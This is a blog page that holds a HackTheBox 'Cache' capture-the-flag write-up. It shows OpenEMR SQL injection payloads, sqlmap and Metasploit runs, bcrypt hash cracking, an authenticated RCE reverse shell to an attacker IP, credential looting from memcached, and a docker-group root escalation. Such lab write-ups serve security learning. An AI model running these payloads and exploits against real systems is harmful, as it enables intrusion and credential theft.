<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Cache | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Cache HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/cache/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/cache/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Cache "><meta property="og:description" content="Cache HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/cache/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/cache/cache.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-10-10T19:09:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/cache/cache.png"><meta name=twitter:title content="Cache "><meta name=twitter:description content="Cache HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Cache ","item":"https://s4ch.github.io/writeups/hackthebox/cache/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Cache ","name":"Cache ","description":"Cache HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Cache Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n1 $ pacman -S nmap lynx ffuf exploitdb metasploit sqlmap john docker Network enumeration Quick nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Fri Jun 12 13:19:40 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.188 Nmap scan report for 10.10.10.188 Host is up (0.021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA) | 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA) |_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Cache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:20:07 2020 -- 1 IP address (1 host up) scanned in 26.73 seconds Let’s set the local domain in /etc/hosts:\n1 2 $ cat /etc/hosts | grep cache 10.10.10.188 cache.htb HTTP enumeration \u0026 discovery Let’s see which pages are listed on the home page:\n1 2 3 4 5 6 $ lynx -dump -listonly -nonumbers http://cache.htb/index.html http://cache.htb/index.html http://cache.htb/news.html http://cache.htb/contactus.html http://cache.htb/login.html http://cache.htb/author.html If we look at the source of login.html we can see this script is included:\n1 \u003cscript src=\"jquery/functionality.js\"\u003e\u003c/script\u003e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $(function(){ var error_correctPassword = false; var error_username = false; function checkCorrectPassword(){ var Password = $(\"#password\").val(); if(Password != 'H@v3_fun'){ alert(\"Password didn't Match\"); error_correctPassword = true; } } function checkCorrectUsername(){ var Username = $(\"#username\").val(); if(Username != \"ash\"){ alert(\"Username didn't Match\"); error_username = true; } } $(\"#loginform\").submit(function(event) { /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false \u0026\u0026 error_username ==false){ return true; } else{ return false; } }); }); So the creds are:\nusername: ash password: H@v3_fun That let us access to http://cache.htb/net.html, a page under construction. This is just a troll.\nAt http://cache.htb/author.html, the author is talking about another project: HMS.\nhms page or directory don’t exist; lets’ try to enumerate more with ffuf.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 $ ffuf -u http://cache.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://cache.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ login.html [Status: 200, Size: 2421, Words: 389, Lines: 106] index.html [Status: 200, Size: 8193, Words: 902, Lines: 339] news.html [Status: 200, Size: 7231, Words: 948, Lines: 100] author.html [Status: 200, Size: 1522, Words: 180, Lines: 68] . [Status: 200, Size: 8193, Words: 902, Lines: 339] contactus.html [Status: 200, Size: 2539, Words: 283, Lines: 148] jquery [Status: 200, Size: 951, Words: 65, Lines: 17] net.html [Status: 200, Size: 290, Words: 23, Lines: 19] :: Progress: [114801/114801] :: Job [1/1] :: 1739 req/sec :: Duration: [0:01:06] :: Errors: 0 :: That didn’t gave us new pages. In fact guessing was required to find another virtual host.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ffuf -u http://10.10.10.188/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.htb' -fs 8193 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.188/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 8193 ________________________________________________ hms [Status: 200, Size: 7850, Words: 1925, Lines: 159] :: Progress: [38267/38267] :: Job [1/1] :: 911 req/sec :: Duration: [0:00:42] :: Errors: 0 :: Let’s add this entry in /etc/hosts too.\n1 2 $ cat /etc/hosts | grep hms 10.10.10.188 hms.htb We are quickly redirected to http://hms.htb/interface/login/login.php?site=default\nHTTP exploitation (OpenEMR): SQLi Its seems we have an openEMR instance.\nThere are many exploits but we don’t know which version this is.\nUsually I never go to EDB website and only use searchsploit, but this time we don’t know the version used, the only thing we know is that is was a version probably released in 2018 as the copyright is from 2018.\nBy searching on EDB website, we have the date of publication of the exploit. So with some luck we can begin with the exploits published in 2018.\nhttps://www.exploit-db.com/search?q=openemr\nBut those two exploits require authentication. No luck.\nSo let’s see what exploits are also in [Metasploit][msf]:\n1 2 3 4 5 6 7 8 9 10 msf5 \u003e search openemr Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/sqli/openemr/openemr_sqli_dump 2019-05-17 normal Yes OpenEMR 5.0.1 Patch 6 SQLi Dump 1 exploit/unix/webapp/openemr_sqli_privesc_upload 2013-09-16 excellent Yes OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution 2 exploit/unix/webapp/openemr_upload_exec 2013-02-13 excellent Yes OpenEMR PHP File Upload Vulnerability The first one seems promising, let’s set it up:\n1 2 3 4 5 6 7 8 9 10 11 12 msf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e options Module options (auxiliary/sqli/openemr/openemr_sqli_dump): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.188 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the OpenEMR installation VHOST hms.htb no HTTP server virtual host When we run it we can see the exploit works, but it seems poorly written because it is trying to dump all system tables (295) and it’s pretty slow.\n1 2 3 4 5 6 7 8 msf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e run [*] Running module against 10.10.10.188 [*] DB Version: 5.7.30-0ubuntu0.18.04.1 [*] Enumerating tables, this may take a moment... [*] Identified 295 tables. [*] Dumping table (1/295): CHARACTER_SETS [*] Dumping table (2/295): COLLATIONS So let’s exit that, the msf module will take hours to extract all those useless tables.\nNow we know the this SQLi is working let’s see what exploit it is exactly:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 msf5 auxiliary(sqli/openemr/openemr_sqli_dump) \u003e info Name: OpenEMR 5.0.1 Patch 6 SQLi Dump Module: auxiliary/sqli/openemr/openemr_sqli_dump License: Metasploit Framework License (BSD) Rank: Normal Disclosed: 2019-05-17 Provided by: Will Porter Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.188 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the OpenEMR installation VHOST hms.htb no HTTP server virtual host Description: This module exploits a SQLi vulnerability found in OpenEMR version 5.0.1 Patch 6 and lower. The vulnerability allows the contents of the entire database (with exception of log and task tables) to be extracted. This module saves each table as a `.csv` file in your loot directory and has been tested with OpenEMR 5.0.1 (3). References: https://cvedetails.com/cve/CVE-2018-17179/ https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617 In metasploit you can use the edit command to open your default editor on the source code of the module. By doing that I read the code of the msf module and saw how to detect openEMR version with method openemr_version:\n1 2 3 4 5 6 7 8 9 10 11 def openemr_version res = send_request_cgi( 'method' =\u003e 'GET', 'uri' =\u003e normalize_uri(uri, 'admin.php') ) vprint_status(\"admin.php response code: #{res.code}\") document = Nokogiri::HTML(res.body) document.css('tr')[1].css('td')[3].text rescue StandardError '' end Let’s just go to http://hms.htb/admin.php to check the version installed:\nWe have exactly 5.0.1 (3).\nNow by reading get_response method we know which endpoint is requested and which parameter is vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def get_response(payload) response = send_request_cgi( 'method' =\u003e 'GET', 'uri' =\u003e normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'), 'vars_get' =\u003e { 'action' =\u003e 'make_task', 'from_id' =\u003e '1', 'to_id' =\u003e '1', 'pid' =\u003e '1', 'doc_type' =\u003e '1', 'doc_id' =\u003e '1', 'enc' =\u003e \"1' and updatexml(1,concat(0x7e, (#{payload})),0) or '\" } ) response end Before dumping anything we can verify manually the URL:\nFine, we can now fire [sqlmap][sqlmap], retrieve DBMS banner:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 $ sqlmap -u 'http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task\u0026from_id=1\u0026to_id=1\u0026pid=1\u0026doc_type=1\u0026doc_id=1\u0026enc=1' -p enc -b --random-agent ___ __H__ ___ ___[(]_____ ___ ___ {1.4.4#stable} |_ -| . [.] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 21:51:36 /2020-07-14/ [21:51:36] [INFO] fetched random HTTP User-Agent header value 'Opera/8.51 (X11; Linux i686; U; en)' from file '/opt/sqlmap/data/txt/user-agents.txt' [21:51:37] [INFO] testing connection to the target URL you have not declared cookie(s), while server wants to set its own ('OpenEMR=b9g6um1rbhc...dmd5cln601'). Do you want to use those [Y/n] n [21:52:08] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS [21:52:08] [INFO] testing if the target URL content is stable [21:52:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:54:08] [CRITICAL] connection timed out to the target URL [21:54:08] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c [21:54:24] [CRITICAL] can't check dynamic content because of lack of page content [21:54:24] [INFO] heuristic (basic) test shows that GET parameter 'enc' might be injectable (possible DBMS: 'MySQL') [21:54:24] [INFO] testing for SQL injection on GET parameter 'enc' it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n [21:54:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [21:55:29] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests [21:55:29] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:56:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:57:55] [CRITICAL] connection timed out to the target URL [21:58:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [21:59:55] [CRITICAL] connection timed out to the target URL [22:00:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) [22:01:55] [CRITICAL] connection timed out to the target URL [22:02:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s) there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N [22:03:36] [ERROR] user quit [22:03:36] [WARNING] you haven't updated sqlmap for more than 84 days!!! [*] ending @ 22:03:36 /2020-07-14/ It’s kinda working but pretty slow and unstable, so let’s find another endpoint as it seems there are many SQLi.\nThere is a document OpenEMR v5.0.1.3 - Vulnerability Report for exactly the same version as us. A dozen of SQLi are listed here.\n1 2 3 4 5 6 7 8 9 10 11 12 13 portal/find_appt_popup_user.php?catid=1' AND (SELECT 0FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- - portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION())) interface/forms/eye_mag/php/Anything_simple.php?display=i\u0026encounter=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\u0026category_name=POSTSEG interface/forms_admin/forms_admin.php?id=32' OR (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\u0026method=enable interface/de_identification_forms/find_code_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search interface/de_identification_forms/find_immunization_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search interface/de_identification_forms/find_code_popup.php?search_status=1\u0026search_term=')+or+updatexml(null,concat(0x0a,version()),null)--+-\u0026bn_search=Search The ones in 3.1 and 3.2 (portal) seems to give a SQL error while those from 3.3 to 3.9 seem to require authentication.\nThose two request won’t works because we need valid cookies even if the attack is unauthenticated. Also we need to fill the registration form with random data even if we never receive the confirmation email, this will set a valid cookie.\n1 2 $ sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' -p eid --random-agent --threads 10 --batch -b $ sqlmap -u 'http://hms.htb/portal/find_appt_popup_user.php?catid=1' -p catid --random-agent --threads 10 --batch -b So we have to add the --cookie option:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 $ sqlmap -u 'http://hms.htb/portal/add_edit_event_user.php?eid=1' -p eid --cookie 'OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e' --random-agent --threads 10 --batch -b ___ __H__ ___ ___[.]_____ ___ ___ {1.4.4#stable} |_ -| . [,] | .'| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 23:28:23 /2020-07-14/ [23:28:23] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1' from file '/opt/sqlmap/data/txt/user-agents.txt' [23:28:23] [INFO] resuming back-end DBMS 'mysql' [23:28:23] [INFO] testing connection to the target URL [23:28:23] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests sqlmap resumed the following injection point(s) from stored session: --- Parameter: eid (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: eid=(SELECT (CASE WHEN (8435=8435) THEN 1 ELSE (SELECT 1164 UNION SELECT 9741) END)) Type: error-based Title: MySQL \u003e= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: eid=1 AND EXTRACTVALUE(4452,CONCAT(0x5c,0x71787a7a71,(SELECT (ELT(4452=4452,1))),0x717a716271)) Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: eid=1 AND (SELECT 5294 FROM (SELECT(SLEEP(5)))KKhg) Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x73535a4b567775646f4d7849526d4b6d4a697572466f44734446724d5072526b7079474c6a616242,0x717a716271),NULL-- - --- [23:28:23] [INFO] the back-end DBMS is MySQL [23:28:23] [INFO] fetching banner back-end DBMS operating system: Linux Ubuntu back-end DBMS: MySQL \u003e= 5.1 banner: '5.7.30-0ubuntu0.18.04.1' [23:28:23] [INFO] fetched data logged to text files under '/home/cyfun/.sqlmap/output/hms.htb' [23:28:23] [WARNING] you haven't updated sqlmap for more than 84 days!!! [*] ending @ 23:28:23 /2020-07-14/ Alternatively you can store the raw HTTP request in a file:\n1 2 3 4 5 6 7 8 9 10 GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1 Host: hms.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 And then tell sqlmap to use this req file:\n1 $ sqlmap -r \"$(pwd)/sqli.req\" --random-agent --threads 10 --batch -b Now let’s use sqlmap dump options.\n--dbs\n1 2 3 available databases [2]: [*] information_schema [*] openemr -D openemr --tables\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Database: openemr [234 tables] +---------------------------------------+ | array | | groups | | sequences | ... | user_settings | | users | | users_facility | | users_secure | | valueset | | voids | | x12_partners | +---------------------------------------+ -D openemr -T users --columns\n-D openemr -T users -C username,password --dump\n1 2 3 4 5 6 7 8 9 10 Database: openemr Table: users [3 entries] +-----------------+--------------+ | username | password | +-----------------+--------------+ | openemr_admin | NoLongerUsed | | phimail-service | NoLogin | | portal-user | NoLogin | +-----------------+--------------+ It seems not to be the right table, lets’ try this one instead.\n-D openemr -T users_secure -C username,password --dump\n1 2 3 4 5 6 7 8 Database: openemr Table: users_secure [1 entry] +---------------+--------------------------------------------------------------+ | username | password | +---------------+--------------------------------------------------------------+ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | +---------------+--------------------------------------------------------------+ Let’s put the hash in a file to crack it with [JtR][JtR]:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ printf %s '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' \u003e hash.txt $ john -w /usr/share/wordlists/password/rockyou.txt --format=bcrypt hash.txt Warning: invalid UTF-8 seen reading /usr/share/wordlists/password/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 32 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status xxxxxx (?) 1g 0:00:00:01 DONE (2020-07-15 00:51) 0.6369g/s 722.2p/s 722.2c/s 722.2C/s water..zombie Use the \"--show\" option to display all of the cracked passwords reliably Session completed $ john --show hash.txt ?:xxxxxx 1 password hash cracked, 0 left Now we have some creds: openemr_admin / xxxxxx.\nHTTP exploitation (OpenEMR): RCE Now we will be able to use the authenticated RCE we found earlier.\nWarning: Using EDB-48515 that has a neutral impact rather than EDB-45161 that will reset the config to default for everyone!!!\n1 2 3 4 5 6 7 $ searchsploit -m 48515 Exploit: OpenEMR 5.0.1 - Remote Code Execution URL: https://www.exploit-db.com/exploits/48515 Path: /usr/share/exploitdb/exploits/php/webapps/48515.py File Type: ASCII text, with CRLF line terminators Copied to: /home/cyfun/CTF/HackTheBox/machines/Cache/48515.py Let’s modify, the remote URL, the LHOST, LPORT, and admin creds.\nThen start a listener \u0026 start the exploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ pwncat -l 8888 -vv INFO: Listening on :::8888 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.188:32838 (family 2/IPv4, TCP) Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 23:11:40 up 32 min, 0 users, load average: 0.07, 0.02, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ $ python2 48515.py [+] Authentication with credentials provided please be patient [+] Uploading a payload it will take a minute [+] You should be getting a shell Afterward I created my own exploit for OpenEMR RCE: https://github.com/cyfun/OpenEMR-RCE\n1 2 3 $ ruby OpenEMR-RCE/exploit.rb auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 $ ruby OpenEMR-RCE/exploit.rb semi-auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 -m 'php/reverse_php' $ ruby OpenEMR-RCE/exploit.rb manual -r http://hms.htb -u openemr_admin -p xxxxxx -s tmp548.php Privilege Escalation of Machine : www-data to ash We can use the credentials (ash / H@v3_fun) we found at the beginning.\n1 2 3 4 5 6 7 8 9 10 11 12 $ which python3 /usr/bin/python3 $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@cache:/$ su ash su ash Password: H@v3_fun ash@cache:/$ cd cd ash@cache:~$ cat user.txt cat user.txt aebbdcd5e2a33812b7db84f42f124ea5 But this is totally optional it’s possible to jump over this step and directly elevate to user luffy from www-data.\nPrivilege Escalation of Machine : ash to luffy Let’s see open TCP sockets:\n1 2 3 4 5 6 7 8 9 $ ss -nlpt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* LISTEN 0 128 127.0.0.1:11211 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* LISTEN 0 128 [::]:11211 [::]:* LISTEN 0 128 *:80 *:* Ohoh we have port 11211 used by memcached.\nWe can confirm the process is running:\n1 2 3 4 $ ps -ef f | grep memcached memcache 1125 1 0 22:39 ? Ssl 0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid ash 6235 5474 0 23:30 pts/1 S+ 0:00 | \\_ grep --color=auto memcached www-data 4693 4669 0 23:04 ? Sl 0:00 | \\_ memcached Let’s check some advices on HackTricks: 11211 - Pentesting Memcache\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 $ telnet 127.0.0.1 11211 telnet 127.0.0.1 11211 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '^]'. version version VERSION 1.5.6 Ubuntu stats items stats items STAT items:1:number 5 ... stats cachedump 1 0 stats cachedump 1 0 ITEM link [21 b; 0 s] ITEM user [5 b; 0 s] ITEM passwd [9 b; 0 s] ITEM file [7 b; 0 s] ITEM account [9 b; 0 s] END get user get user VALUE user 0 5 luffy END get passwd get passwd VALUE passwd 0 9 0n3_p1ec3 END get file get file VALUE file 0 7 nothing END get account get account VALUE account 0 9 afhj556uo END quit quit Now we can use the creds: luffy / 0n3_p1ec3.\n1 2 3 4 5 6 7 $ su luffy su luffy Password: 0n3_p1ec3 luffy@cache:/$ cd cd luffy@cache:~$ Privilege Escalation of Machine : luffy to root We can see there is docker running and the user is in docker group.\n1 2 3 4 5 6 7 $ id uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) $ ps -ef f | grep docker ps -ef f | grep docker root 918 1 0 22:39 ? Ssl 0:05 /usr/bin/dockerd -H fd:// root 1358 918 0 22:39 ? Ssl 0:04 \\_ containerd --config /var/run/docker/containerd/containerd.toml --log-level info root 6934 1358 0 23:45 ? Sl 0:00 \\_ containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/f211bc4cffb910b8c45b09d9eeec6c9483af4fff6222a5ca7c211aef6ca3bc94 -address /var/run/docker/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc Being in docker group is like being root because of the capabilities.\nMy reflex is to check GTFOBins if there are some ready to use payloads for pe, and there is.\nLet’s find what images are available:\n1 2 3 4 $ docker images docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 2ca708c1c9cc 10 months ago 64.2MB So let’s spawn a shell through a shared volume:\n1 2 3 4 5 6 7 8 9 10 luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash root@ae6411b77a1e:/# cd 